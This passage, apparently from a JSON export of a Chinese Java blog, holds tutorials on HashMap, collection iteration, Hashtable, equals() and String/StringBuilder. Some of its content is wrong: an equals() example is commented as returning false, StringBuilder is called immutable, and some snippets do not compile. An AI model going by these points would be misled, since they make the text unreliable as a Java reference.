https://coolshell.cn/articles/9606.htmlw","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类 - HashMap","date":"2019-03-14T14:14:29.000Z","path":"2019/03/14/【Java】集合类-HashMap/","text":"HashMap类HashMap类实现了Map&lt;K,V&gt;接口，同时继承了抽象类 AbstractMap&lt;E&gt;。 HashMap是基于哈希表实现的，每一个元素是一个key-value对，其内部通过单链表解决冲突问题，容量不足（超过了阀值）时，同样会自动增长。 特点非线程安全HashMap是非线程安全的，只适用于单线程环境下。而在多线程环境下，可以采用concurrent并发包下的concurrentHashMap。 null值HashMap允许键或值为null。 但由于HashMap不允许重复的键（key），因此只有一条记录的键（key）可以是空值（null）。 当调用HashMap的get()方法返回null值时，既可以表示 HashMap中没有该键，也可以表示该键所对应的值为null。 因此，在HashMap中不能由get()方法来判断HashMap中是否存在某个键， 而应该用containsKey()方法来判断。 操作添加元素1public Object put(Object Key,Object value) 过程解析 调用Put方法的时候发生了什么呢？ 比如调用 hashMap.put(“apple”, 0) ，插入一个Key为“apple”的元素。这时候我们需要利用一个哈希函数来确定Entry的插入位置（index）： 1index = Hash (“apple”); 假定最后计算出的index是2，那么结果如下： 但是，因为HashMap的长度是有限的，当插入的Entry越来越多时，再完美的Hash函数也难免会出现index冲突的情况（哈希冲突）。比如下面这样： 这时候该怎么办呢？我们可以利用链表来解决。 HashMap数组的每一个元素不止是一个Entry对象，也是一个链表的头节点。每一个Entry对象通过Next指针指向它的下一个Entry节点。当新来的Entry映射到冲突的数组位置时，只需要插入到对应的链表即可： 新来的Entry节点插入链表时，使用的是“头插法”。 获取元素1public V get(Object key) 使用Get方法根据Key来查找Value的时候，发生了什么呢？ 首先会把输入的Key做一次Hash映射，得到对应的index： 1index = Hash (“apple”); 由于刚才所说的Hash冲突，同一个位置有可能匹配到多个Entry，这时候就需要顺着对应链表的头节点，一个一个向下来查找。假设我们要查找的Key是“apple”： 第一步：我们查看的是头节点Entry6，Entry6的Key是banana，显然不是我们要找的结果。 第二步：我们查看的是Next节点Entry1，Entry1的Key是apple，正是我们要找的结果。 之所以把Entry6放在头节点，是因为HashMap的发明者认为，后插入的Entry被查找的可能性更大。 删除元素如果key对应的value存在，则删除这个键值对。 并返回value。如果不存在 返回null。 12345public V remove(Object key) &#123; Node&lt;K,V&gt; e; return (e = removeNode(hash(key), key, null, false, true)) == null ? null : e.value;&#125; 判断元素是否存在1public boolean containsKey(Object key) 存储原理HashMap内部维护了一个用于存储元素的哈希数组，每一个数组元素都是一个 Entry 对象实例（每一个数组元素逻辑上称为一个 Bucket）。 而每个Bucket逻辑上都是一个单向链表（LinkedList），单向链表中可以存储多个Entry对象。 之所以成为逻辑上，是因为我们没有使用LinkedList类型的对象作为哈希数组的元素，而是使用Entry 对象。每个Entry 对象实例都有一个名为next的指针，指向下一个Entry 对象，从而形成单向链表（或者说，自己实现了一个简化版的LinkedList类）。 HashMap采用链表解决冲突。当准备添加一个键值对时，首先通过hash(key)方法（哈希函数，Hash Function）计算hash值，然后通过 indexFor(hash,length) 得到该待存储键值对的在这个HashMap的哈希数组中的存储位置（即哈希数组的一个索引下标）。 计算方法是先用hash&amp;0x7FFFFFFF后，再对length取模，这就保证每一个key-value对都能存入HashMap中。 如果这个在哈希数组的这个索引下标位置，已经存放有其他键值对元素了，则将新加入的键值对元素将放在链表的头部，最早加入的键值对元素放在链表的尾部。 如上图中，左侧是一个哈希数组（存储在HashMap对象中），数组的每个元素都是一个Entry对象，同时每个对象也是一个单链表的头节点，链表是用来解决冲突的，如果不同的key映射到了哈希数组的同一位置处，就将其放入单链表中，其中新加入的元素放在链表的头部，最早加入的放在链表的尾部）。 如果定位到的数组位置不含链表（当前Entry的next指向null），那么对于查找，添加等操作很快，仅需一次寻址即可；如果定位到的数组包含链表，对于添加操作，其时间复杂度依然为O(1)，因为最新的Entry会插入链表头部，仅需简单改变引用链即可，而对于查找操作来讲，此时就需要遍历链表，然后通过key对象的equals方法逐一比对查找。所以，出于性能考虑，HashMap中的链表出现越少，性能才会越好。 扩容机制需求HashMap的容量是有限的。当经过多次元素插入，使得HashMap达到一定饱和度时，Key映射位置发生冲突的几率会逐渐提高。 这时候，HashMap需要扩展它的长度，也就是进行扩容（Resize）。 影响发生Resize的因素有三个： 容量（Capacity）：HashMap的当前长度，是2的幂。 负载因子（LoadFactor）：HashMap负载因子，默认值为0.75f。 当前HashMap中键值对（key-value）的数量（size） 衡量HashMap是否进行Resize的阈值（threshold）如下： 1HashMap.Size &gt;= Capacity * LoadFactor 负载因子（LoadFactor） 如果加载因子越大，对空间的利用更充分，但是查找效率会降低（链表长度会越来越长）； 如果加载因子太小，那么表中的数据将过于稀疏（很多空间还没用，就开始扩容了），对空间造成严重浪费。 如果我们在构造方法中不指定，则系统默认加载因子为0.75，这是一个比较理想的值，一般情况下我们是无需修改的。 实现扩容需要经历下面两个过程： 1 扩容创建一个新的Entry空数组，长度是原数组的2倍。 2 Rehashing遍历原Entry数组，把所有的Entry重新Hash到新数组。为什么要重新Hash呢？因为长度扩大以后，Hash的规则也随之改变。 扩容过程解析让我们回顾一下Hash公式： index = HashCode（Key） &amp; （Length - 1） 当原数组长度为8时，Hash运算是和111B做与运算；新数组长度为16，Hash运算是和1111B做与运算。Hash结果显然不同。 Resize前的HashMap： Resize后的HashMap： ReHash的Java代码如下： 123456789101112131415161718/** * Transfers all entries from current table to newTable. */void transfer(Entry[] newTable, boolean rehash) &#123; int newCapacity = newTable.length; for (Entry&lt;K,V&gt; e : table) &#123; while(null != e) &#123; Entry&lt;K,V&gt; next = e.next; if (rehash) &#123; e.hash = null == e.key ? 0 : hash(e.key); &#125; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; &#125;&#125; JDK 1.8 后的改进在JDK1.8 对HashMap做了改造，如下图： JDK 1.8 以前 HashMap 的实现是 数组+链表，即使哈希函数取得再好，也很难达到元素百分百均匀分布。 当 HashMap 中有大量的元素都存放到同一个Bucket 中时，这个Bucket下有一条长长的链表，这个时候 HashMap 就相当于一个单链表，假如单链表有 n 个元素，遍历的时间复杂度就是 O(n)，完全失去了它的优势。 针对这种情况，JDK 1.8 中引入了红黑树（查找时间复杂度为 $O(log_2n))$ 来优化这个问题。 HashSet和HashMap的区别 HashMap HashSet HashMap实现了Map&lt;K,V&gt;接口 HashSet实现了Set&lt;E&gt;接口 HashMap储存键值对（HashMap以一组键值对（key-value）作为元素） HashSet仅仅存储对象（HashSet以对象作为元素） 使用put()方法将元素放入map中 使用add()方法将元素放入set中 HashMap中使用键对象来计算hashcode值 HashSet使用成员对象来计算hashcode值，对于两个对象来说hashcode可能相同，所以equals()方法用来判断对象的相等性，如果两个对象不同的话，那么返回false HashMap比较快，因为是使用唯一的键来获取对象 HashSet较HashMap来说比较慢 HashMap 和 Hashtable 的区别HashMap 和 Hashtable 都实现了 Map&lt;K,V&gt; 接口，但决定用哪一个之前先要弄清楚它们之间的分别。主要的区别有：线程安全性（Thread safety），null值允许，以及速度。 HashMap 几乎可以等价于 Hashtable，除了 HashMap 是非 synchronized 的，并可以接受 null（HashMap 可以接受为 null 的键值（key）和值（value），而 Hashtable 则不行)。 互斥访问（mutual exclusion） HashMap 是非 synchronized，而 Hashtable 是 synchronized。 这意味着 Hashtable 是线程安全的，多个线程可以共享一个 Hashtable；而如果没有正确的同步的话，多个线程是不能共享 HashMap 的。Java 5 提供了 ConcurrentHashMap，它是HashTable的替代，比HashTable的扩展性更好。 由于Hashtable是线程安全的也是synchronized，所以在单线程环境下它比HashMap要慢。如果你不需要同步，只需要单一线程，那么使用HashMap性能要好过Hashtable。 是否允许 null 值 Hashtable中，key和value都不允许出现null值。 在HashMap中，null可以作为键，这样的键只有一个；但是，可以有一个或多个键所对应的值为null。当get()方法返回null值时，即可以表示 HashMap中没有该键，也可以表示该键所对应的值为null。因此，在HashMap中不能由get()方法来判断HashMap中是否存在某个键， 而应该用containsKey()方法来判断。 迭代器另一个区别是HashMap的迭代器（Iterator）是fail-fast迭代器，而由于历史原因，Hashtable还使用了Enumeration的方式 。 所以，当有其它线程改变了HashMap的结构（增加或者移除元素），将会抛出ConcurrentModificationException，但迭代器本身的remove()方法移除元素则不会抛出ConcurrentModificationException异常。但这并不是一个一定发生的行为，要看JVM。这条同样也是Enumeration和Iterator的区别。 哈希值的使用不同HashTable直接使用对象的hashCode，如下： 12int hash = key.hashCode();int index = (hash &amp; 0x7FFFFFFF) % tab.length; 而HashMap重新计算hash值。 结论Hashtable和HashMap有几个主要的不同：线程安全以及速度。仅在你需要完全的线程安全的时候使用Hashtable，而如果你使用Java 5或以上的话，请使用ConcurrentHashMap吧。 Reference 漫画：什么是HashMap？ - https://juejin.im/post/5a215783f265da431d3c7bba 漫画：高并发下的HashMap - https://juejin.im/post/5a224e1551882535c56cb940 图解HashMap(一) - https://juejin.im/post/5a23f82ff265da432003109b 疫苗：JAVA HASHMAP的死循环 - https://coolshell.cn/articles/9606.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-Collection接口的三种遍历方法","date":"2019-03-14T14:13:05.000Z","path":"2019/03/14/【Java】集合类-Collection接口的三种遍历方法/","text":"第一种 - Iterator（迭代器） 12345Iterator&lt;String&gt; iterator = list.iterator(); while(iter.hasNext()) &#123; iter.next(); &#125; 这种方式在循环执行过程中会进行数据锁定，性能稍差。 同时，如果你想在进行遍历的过程中，移除List中的某个元素，只能调用iterator.remove方法，而不能使用list.remove()方法，否则会抛出并发修改异常（java.util.ConcurrentModificationException）。 第二种 - foreach1234for(String tmp:list) &#123; //do something&#125; foreach只是Java提供的语法糖，内部调用Iterator（第一种），换汤不换药，因此比 Iterator 稍慢。 第三种 - get(i)1234int listSize = list.size();for (int i = 0; i &lt; listSize; i++) &#123; list.get(i);&#125; 内部不锁定，效率最高，但是当写多线程时要考虑并发操作的问题。 Iterator（迭代器）的使用 - Fail fast问题前面我们提到了，如果你想在使用Iterator（迭代器）进行遍历的过程中，移除List中的某个元素，只能调用iterator.remove方法，而不能调用list.remove()方法，否则一定会抛出并发修改异常（java.util.ConcurrentModificationException）。 注意，当这个异常被抛出时，并不意味着这个list一定正在被多个线程同时使用，而在同一个线程中既一边遍历 list，一边调用list.remove()方法，也会抛出ConcurrentModificationException。 解决办法可以使用CopyOnWriteArrayList来替换ArrayList。 CopyOnWriteArrayList为何物？CopyOnWriteArrayList是ArrayList 的一个线程安全的变体，其中所有可变操作（add、set 等等）都是通过对底层数组进行一次新的复制来实现的。 因此，该类产生的开销比较大，但是在两种情况下，它非常适合使用： 在不能或不想进行同步遍历，但又需要从并发线程中排除冲突时。 当遍历操作的数量大大超过可变操作的数量时。 遇到这两种情况使用CopyOnWriteArrayList来替代ArrayList再适合不过了。 那么，为什么CopyOnWriterArrayList可以替代ArrayList呢？ CopyOnWriterArrayList的无论是从数据结构、定义都和ArrayList一样。它和ArrayList一样，同样是实现List接口，底层使用数组实现。在方法上也包含add、remove、clear、iterator等方法。 CopyOnWriterArrayList根本就不会产生ConcurrentModificationException异常，也就是它使用迭代器完全不会产生fail-fast机制。 Reference Java提高篇（三四）—–fail-fast机制 - https://www.cnblogs.com/chenssy/p/3870107.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-HashSet、HashMap 和 HashTable","date":"2019-03-13T04:57:14.000Z","path":"2019/03/13/【Java】集合类-HashSet、HashMap-和-HashTable/","text":"集合框架集合框架有自己的接口和实现，主要分为Set接口，List接口，Map接口和Queue接口。 它们有各自的特点： Set接口里存放的对象是无序，不能重复的，集合中的对象不按特定的方式排序，只是简单地把对象加入集合中。 List接口是一个有序的集合，同时也是可以重复的，List关注的是索引，拥有一系列和索引相关的方法，查询速度快。因为往list集合里插入或删除数据时，会伴随着后面数据的移动，所有插入删除数据速度慢。 Map接口中存储的是键值对，键不能重复，值可以重复。根据键得到值，对map集合遍历时先得到键的set集合，对set集合进行遍历，得到相应的值。 Queue接口的工作原理是 FCFS 算法（First Come, First Serve）。 有序否TreeMap 允许元素重复否 Collection 否 是 List 是 是 Set AbstractSet 否 否 Set HashSet 否 Set TreeSet 是（用二叉树排序） 否 Map AbstractMap 否 使用key-value来映射和存储数据，Key必须惟一，value可以重复 Map HashMap 否 使用key-value来映射和存储数据，Key必须惟一，value可以重复 Map TreeMap 是（用二叉树排序） 使用key-value来映射和存储数据，Key必须惟一，value可以重复 List接口List 接口对Collection接口进行了简单的扩充，它的具体实现类常用的有ArrayList和LinkedList。 你可以将任何东西放到一个List容器中，并在需要时从中取出。 ArrayList从其命名中可以看出它是一种类似数组的形式进行存储，因此它的随机访问速度极快。 而LinkedList的内部实现是链表，它适合于在链表中间需要频繁进行插入和删除操作。 Set接口Set接口也是 Collection的一种扩展，而与List不同的时，在Set中的对象元素不能重复，也就是说你不能把同样的东西两次放入同一个Set容器中。它的常用具体实现有HashSet和TreeSet类。 HashSet能快速定位一个元素，但是你放到HashSet中的对象需要实现hashCode()方法。 而TreeSet则将放入其中的元素按序存放，这就要求你放入其中的对象是可排序的。 Map接口Map接口是一种把键对象（key）和值对象（value）进行关联的容器，而一个值对象又可以是一个Map，依次类推，这样就可形成一个多级映射。 对于键对象来说，像Set一样，一个Map容器中的键对象不允许重复，这是为了保持查找结果的一致性；如果有两个键对象一样，那你想得到那个键对象所对应的值对象时就有问题了，可能你得到的并不是你想的那个值对象，结果会造成混乱，所以键的唯一性很重要，也是符合集合的性质的。 当然在使用过程中，某个键所对应的值对象可能会发生变化，这时会按照最后一次修改的值对象与键对应。对于值对象则没有唯一性的要求。你可以将任意多个键都映射到一个值对象上，这不会发生任何问题（不过对你的使用却可能会造成不便，你不知道你得到的到底是那一个键所对应的值对象）。 Map有两种比较常用的实现： HashMap和TreeMap。 HashSetHashSet实现了Set&lt;E&gt;接口，同时继承了抽象类 AbstractSet&lt;E&gt;，它不允许集合中有重复的值，当我们提到HashSet时，第一件事情就是在将对象存储在HashSet之前，要先确保对象重写equals()和hashCode()方法，这样才能比较对象的值是否相等，以确保set中没有储存相等的对象。如果我们没有重写这两个方法，将会使用这个方法的默认实现。 public boolean add(Object o)方法用来在Set中添加元素，当元素值重复时则会立即返回false，如果成功添加的话会返回true。 HashSet底层采用的是HashMap进行实现。 HashMapHashMap实现了Map&lt;K,V&gt;接口，同时继承了抽象类 AbstractMap&lt;E&gt;。 HashMap是基于哈希表实现的，每一个元素是一个key-value对，其内部通过单链表解决冲突问题，容量不足（超过了阀值）时，同样会自动增长。 特性非线程安全HashMap是非线程安全的，只是用于单线程环境下，多线程环境下可以采用concurrent并发包下的concurrentHashMap。 null值HashMap允许键或值为null。 但由于HashMap不允许重复的键（key），因此只有一条记录的键（key）可以是空值（null）。 当调用HashMap的get()方法返回null值时，既可以表示 HashMap中没有该键，也可以表示该键所对应的值为null。 因此，在HashMap中不能由get()方法来判断HashMap中是否存在某个键， 而应该用containsKey()方法来判断。 存储原理HashMap内部维护了一个用于存储元素的哈希数组，每一个数组元素都是一个 Entry 对象实例（每一个数组元素逻辑上称为一个 Bucket）。 而每个Bucket逻辑上都是一个单向链表（LinkedList），单向链表中可以存储多个Entry对象。 之所以成为逻辑上，是因为我们没有使用LinkedList类型的对象作为哈希数组的元素，而是使用Entry 对象。每个Entry 对象实例都有一个名为next的指针，指向下一个Entry 对象，从而形成单向链表。 HashMap采用链表解决冲突。当准备添加一个键值对时，首先通过hash(key)方法计算hash值，然后通过indexFor(hash,length)得到该待存储键值对的在这个HashMap的哈希数组中的存储位置（本质是哈希数组的一个索引下标）。 计算方法是先用hash&amp;0x7FFFFFFF后，再对length取模，这就保证每一个key-value对都能存入HashMap中。 如果这个在哈希数组的这个索引下标位置，已经存放有其他键值对元素了，则将新加入的键值对元素将放在链表的头部，最早加入的键值对元素放在链表的尾部。 如上图中，左侧是一个哈希数组（存储在HashMap对象中），数组的每个元素都是一个Entry对象，同时每个对象也是一个单链表的头节点，链表是用来解决冲突的，如果不同的key映射到了哈希数组的同一位置处，就将其放入单链表中，其中新加入的元素放在链表的头部，最早加入的放在链表的尾部）。 如果定位到的数组位置不含链表（当前Entry的next指向null），那么对于查找，添加等操作很快，仅需一次寻址即可；如果定位到的数组包含链表，对于添加操作，其时间复杂度依然为O(1)，因为最新的Entry会插入链表头部，仅需简单改变引用链即可，而对于查找操作来讲，此时就需要遍历链表，然后通过key对象的equals方法逐一比对查找。所以，出于性能考虑，HashMap中的链表出现越少，性能才会越好。 JDK 1.8 后的改进在JDK1.8 对HashMap做了改造，如下图： JDK 1.8 以前 HashMap 的实现是 数组+链表，即使哈希函数取得再好，也很难达到元素百分百均匀分布。 当 HashMap 中有大量的元素都存放到同一个Bucket 中时，这个Bucket下有一条长长的链表，这个时候 HashMap 就相当于一个单链表，假如单链表有 n 个元素，遍历的时间复杂度就是 O(n)，完全失去了它的优势。 针对这种情况，JDK 1.8 中引入了 红黑树（查找时间复杂度为 $O(log_2n))$来优化这个问题。 HashSet和HashMap的区别 HashMap HashSet HashMap实现了Map&lt;K,V&gt;接口 HashSet实现了Set&lt;E&gt;接口 HashMap储存键值对（HashMap以一组键值对（key-value）作为元素） HashSet仅仅存储对象（HashSet以对象作为元素） 使用put()方法将元素放入map中 使用add()方法将元素放入set中 HashMap中使用键对象来计算hashcode值 HashSet使用成员对象来计算hashcode值，对于两个对象来说hashcode可能相同，所以equals()方法用来判断对象的相等性，如果两个对象不同的话，那么返回false HashMap比较快，因为是使用唯一的键来获取对象 HashSet较HashMap来说比较慢 HashTableHashtable是继承自Dictionary抽象类，同时实现了Map&lt;K,V&gt;接口。 Hashtable同样是基于哈希表实现的，同样每个元素是一个键值对，其内部也是通过单链表解决冲突问题，容量不足（超过了阀值）时，同样会自动增长。 HashMap 和 Hashtable 的区别HashMap 和 Hashtable 都实现了 Map&lt;K,V&gt; 接口，但决定用哪一个之前先要弄清楚它们之间的分别。主要的区别有：线程安全性（Thread safety），null值允许，以及速度。 HashMap 几乎可以等价于 Hashtable，除了 HashMap 是非 synchronized 的，并可以接受 null（HashMap 可以接受为 null 的键值（key）和值（value），而 Hashtable 则不行)。 互斥访问（mutual exclusion） HashMap 是非 synchronized，而 Hashtable 是 synchronized。 这意味着 Hashtable 是线程安全的，多个线程可以共享一个 Hashtable；而如果没有正确的同步的话，多个线程是不能共享 HashMap 的。Java 5 提供了 ConcurrentHashMap，它是HashTable的替代，比HashTable的扩展性更好。 由于Hashtable是线程安全的也是synchronized，所以在单线程环境下它比HashMap要慢。如果你不需要同步，只需要单一线程，那么使用HashMap性能要好过Hashtable。 是否允许 null 值 Hashtable中，key和value都不允许出现null值。 在HashMap中，null可以作为键，这样的键只有一个；但是，可以有一个或多个键所对应的值为null。当get()方法返回null值时，即可以表示 HashMap中没有该键，也可以表示该键所对应的值为null。因此，在HashMap中不能由get()方法来判断HashMap中是否存在某个键， 而应该用containsKey()方法来判断。 迭代器另一个区别是HashMap的迭代器（Iterator）是fail-fast迭代器，而由于历史原因，Hashtable还使用了Enumeration的方式 。 所以当有其它线程改变了HashMap的结构（增加或者移除元素），将会抛出ConcurrentModificationException，但迭代器本身的remove()方法移除元素则不会抛出ConcurrentModificationException异常。但这并不是一个一定发生的行为，要看JVM。这条同样也是Enumeration和Iterator的区别。 哈希值的使用不同HashTable直接使用对象的hashCode，如下： 12int hash = key.hashCode();int index = (hash &amp; 0x7FFFFFFF) % tab.length; 而HashMap重新计算hash值。 结论Hashtable和HashMap有几个主要的不同：线程安全以及速度。仅在你需要完全的线程安全的时候使用Hashtable，而如果你使用Java 5或以上的话，请使用ConcurrentHashMap吧。 Reference HashMap和HashSet的区别 - http://www.importnew.com/6931.html HashMap和Hashtable的区别 - http://www.importnew.com/7010.html HashSet HashTable HashMap的区别 及其Java集合介绍 - http://www.cnblogs.com/ywl925/p/3865269.html HashMap、HashSet和HashTable的区别 - https://www.jianshu.com/p/db2376ec3af2","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】==与equals()","date":"2019-03-12T13:40:52.000Z","path":"2019/03/12/【Java】对象-与equals/","text":"背景Java 中的数据类型，可分为两类： 基本数据类型，也称原始数据类型，比如 byte，short，char，int，long，float，double，boolean 。 复合数据类型（类）。 ==基本数据类型对于基本数据类型，应用双等号（==），比较的是他们的值。 复合数据类型（类）对于复合数据类型（类），当用双等号（==）进行比较的时候，比较的是他们在堆中的地址。所以，除非是同一个 new 出来的对象，他们的比较后的结果为 true，否则比较后结果为 false。 Equals() Java 当中所有的类都是继承于 Object 这个基类的，在 Object 中的基类中定义了一个 equals 的方法，这个方法的默认实现是比较对象的在堆中的地址。 但在一些类库当中这个方法被重写（overwrite）覆盖掉了，如在String、nteger、Date 类中，equals 方法就有不同的实现，而不再是比较类在堆内存中的存放地址了。 对于复合数据类型之间，使用 equals 进行比较时，在没有重写这个对象对应类的 equals 方法的情况下，他们之间的比较还是基于他们在堆空间中的地址值，因为 Object 的 equals 方法也是用双等号（==）进行比较的，所以比较后的结果跟双等号（==）的结果相同。 Equals()具有以下性质： 自反性（reflexive）。对于任意不为null的引用值x，x.equals(x)一定是true。 对称性（symmetric）。对于任意不为null的引用值x和y，当且仅当x.equals(y)是true时，y.equals(x)也是true。 传递性（transitive）。对于任意不为null的引用值x、y和z，如果x.equals(y)是true，同时y.equals(z)是true，那么x.equals(z)一定是true。 一致性（consistent）。对于任意不为null的引用值x和y，如果用于equals比较的对象信息没有被修改的话，多次调用时x.equals(y)要么一致地返回true要么一致地返回false。 对于任意不为null的引用值x，x.equals(null)返回false。 对于Object类来说，equals()方法在对象上实现的是差别可能性最大的等价关系，即，对于任意非null的引用值x和y，当且仅当x和y引用的是同一个对象，该方法才会返回true。 需要注意的是当equals()方法被override时，hashCode()也要被override。按照一般hashCode()方法的实现来说，相等的对象，它们的hash code一定相等。 字符串的不变性字符串（string）不是基本数据类型，而是复合数据类型。但是，JVM 为了提高效率，建立了字符串常量池机制。 我们来看两个例子： 例子112345String s1 = \"Monday\";String s2 = \"Monday\";System.out.println(s1 == s2); //trueSystem.out.println(s1.equals(s2)); //false 分析s1 equals s2 是显然的，因为 String 类重写了 equals 方法，这个 equals 方法的实现是判断两个字符串的每个字符是否相同，若完全相同则返回 true。 值得讨论的是 s1 == s2。在 JVM 进行类加载的阶段（准确的说，是连接（linking）的解析（resolution）阶段），JVM 会将符号 Reference Java中equals和==的区别 - https://www.cnblogs.com/zhxhdean/archive/2011/03/25/1995431.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】String - String，StringBuilder 和 StringBuffer","date":"2019-03-11T08:11:51.000Z","path":"2019/03/11/【Java】String-String，StringBuilder和-StringBuffer/","text":"String类打开 String 类就会发现，它是被 final 修饰的： 12345678910111213141516171819public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence&#123; /** The value is used for character storage. */ private final char value[]; /** The offset is the first index of the storage that is used. */ private final int offset; /** The count is the number of characters in the String. */ private final int count; /** Cache the hash code for the string */ private int hash; // Default to 0 /** use serialVersionUID from JDK 1.0.2 for interoperability */ private static final long serialVersionUID = -6849794470754667710L; ......&#125; 从上面可以看出几点： String 类是 final 类，也即意味着 String 类不能被继承，并且它的成员方法都默认为 final 方法。在 Java 中，被 final 修饰的类是不允许被继承的，并且该类中的成员方法都默认为 final 方法。对于用 final 来修饰方法，只有在确定不想让该方法被覆盖时，才将方法设置为final。 上面列举出了 String 类中所有的成员属性，从上面可以看出String类其实是通过char数组来保存字符串的，而且这个 char 数组不能被改变。 而且，对于 String 类来说，无论是 sub、concat 还是 replace 操作都不是在原有的字符串上进行的，而是重新生成了一个新的字符串对象。也就是说进行这些操作后，最原始的字符串并没有被改变。 在这里要永远记住一点： “对String对象的任何改变都不影响到原对象，相关的任何改变操作都会生成新的对象”。 String 的不可变性虽然 String、StringBuffer 和 StringBuilder 都是 final 类，它们生成的对象都是不可变的，而且它们内部也都是靠 char 数组实现的。 但是不同之处在于，String类中定义的char数组被 final 修饰，而StringBuffer和StringBuilder都是继承自AbstractStringBuilder类。 在AbstractStringBuilder中，char数组只是一个普通是私有变量： 1234567abstract class AbstractStringBuilder implements Appendable, CharSequence &#123; /** * The value is used for character storage. */ char[] value; ...&#125; 因此，对于StringBuffer 和 StringBuilder 对象，都可以通过调用它们的append()方法来不断修改value属性。 String类不可变性的好处 只有当字符串是不可变的，字符串池才有可能实现。字符串池的实现可以在运行时节约很多heap空间，因为不同的字符串变量都指向池中的同一个字符串。但如果字符串是可变的，那么 String interning 将不能实现（String interning 是指对不同的字符串仅仅只保存一个，即不会保存多个相同的字符串）。因为这样的话，如果变量改变了它的值，那么其它指向这个值的变量的值也会一起改变。 如果字符串是可变的，那么会引起很严重的安全问题。譬如，数据库的用户名、密码都是以字符串的形式传入来获得数据库的连接，或者在socket编程中，主机名和端口都是以字符串的形式传入。因为字符串是不可变的，所以它的值是不可改变的，否则黑客们可以钻到空子，改变字符串指向的对象的值，造成安全漏洞。 因为字符串是不可变的，所以是多线程安全的，同一个字符串实例可以被多个线程共享。这样便不用因为线程安全问题而使用同步。字符串自己便是线程安全的。 String str=”hello world”和String str=new String(“hello world”)的区别1234567891011121314151617public class Main &#123; public static void main(String[] args) &#123; String str1 = \"hello world\"; String str2 = new String(\"hello world\"); String str3 = \"hello world\"; String str4 = new String(\"hello world\"); System.out.println(str1==str2); System.out.println(str1==str3); System.out.println(str2==str4); //false //true //false &#125;&#125; 分析在上述代码中，String str1 = “hello world”; 和 String str3 = “hello world”; 都在编译期间生成了字面常量（literal）和符号引用（symbolic reference），运行期间字面常量 “hello world” 被存储在运行时常量池（当然只保存了一份）。 通过这种方式（String str = “hello world”;）来将String对象跟引用绑定的话，JVM 执行引擎会先在运行时常量池查找是否存在相同的字面常量，如果存在，则直接将引用指向已经存在的字面常量；否则在运行时常量池开辟一个空间来存储该字面常量，并将引用指向该字面常量。 String 和 StringBuilder 的区别对比 1既然在Java中已经存在了 String 类，那为什么还需要 StringBuilder 呢？ 那么看下面这段代码： 12345678public class Main &#123; public static void main(String[] args) &#123; String string = \"\"; for(int i=0;i&lt;10000;i++)&#123; string += \"hello\"; &#125; &#125;&#125; 这句 string += “hello”; 的过程，相当于将原有的 String 变量指向对象的内容取出，并与”hello”作字符串相加操作，再存进另一个新的 String 对象当中，再让 string 变量指向新生成的对象。 分析123456789101112131415161718192021222324252627public com.concretepage.lang.Main(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.\"&lt;init&gt;\":()V 4: returnpublic static void main(java.lang.String[]); Code: 0: ldc #2 // String 2: astore_1 3: iconst_0 4: istore_2 5: iload_2 6: sipush 10000 9: if_icmpge 38 12: new #3 // class java/lang/StringBuilder 15: dup 16: invokespecial #4 // Method java/lang/StringBuilder.\"&lt;init&gt;\":()V 19: aload_1 20: invokevirtual #5 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 23: ldc #6 // String hello 25: invokevirtual #5 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 28: invokevirtual #7 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 31: astore_1 32: iinc 2, 1 35: goto 5 38: return 从这段反编译出的字节码文件可以很清楚地看出：从第 12 行开始到第 35 行是整个循环的执行过程，并且每次循环会 new 出一个 StringBuilder 对象，然后进行append操作，最后通过toString方法返回String对象。也就是说这个循环执行完毕new出了10000个对象。 因此，当这些对象还没有及时被回收时，大量的内存资源就暂时无法被使用。而且，对于回收大量对象这个操作本身，也是非常消耗资源的。 我们基于上面的字节码的语义进行分析，其实，上面的代码就等价于下面这样： 12345678910public class Main &#123; public static void main(String[] args) &#123; String string = \"\"; for(int i=0;i&lt;10000;i++)&#123; StringBuilder str = new StringBuilder(string); str.append(\"hello\"); string = str.toString(); &#125; &#125;&#125; 再看下面这段代码： 123456789public class Main &#123; public static void main(String[] args) &#123; StringBuilder stringBuilder = new StringBuilder(); for(int i=0;i&lt;10000;i++)&#123; stringBuilder.append(\"hello\"); &#125; &#125;&#125; 反编译字节码文件得到： 123456789101112131415161718public static void main(java.lang.String[]); Code: 0: new #2 // class java/lang/StringBuilder 3: dup 4: invokespecial #3 // Method java/lang/StringBuilder.\"&lt;init&gt;\":()V 7: astore_1 8: iconst_0 9: istore_2 10: iload_2 11: sipush 10000 14: if_icmpge 30 17: aload_1 18: ldc #4 // String hello 20: invokevirtual #5 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 23: pop 24: iinc 2, 1 27: goto 10 30: return 从这里可以明显看出，这段代码的for循环只进行了一次 new 操作，也就是说只生成了一个对象，append 操作是在原有对象的基础上进行的。因此在循环了 10000 次之后，这段代码所占的资源要比上面小得多。 对比 2在某些特殊情况下， String 对象的字符串拼接其实是被 JVM 解释成了 StringBuffer 对象的拼接，所以这些时候 String 对象的速度并不会比 StringBuffer 对象慢，而特别是以下的字符串对象生成中， String 效率是远要比 StringBuffer 快的： 12String S1 = “This is only a” + “ simple” + “ test”;StringBuffer Sb = new StringBuilder(“This is only a”).append(“ 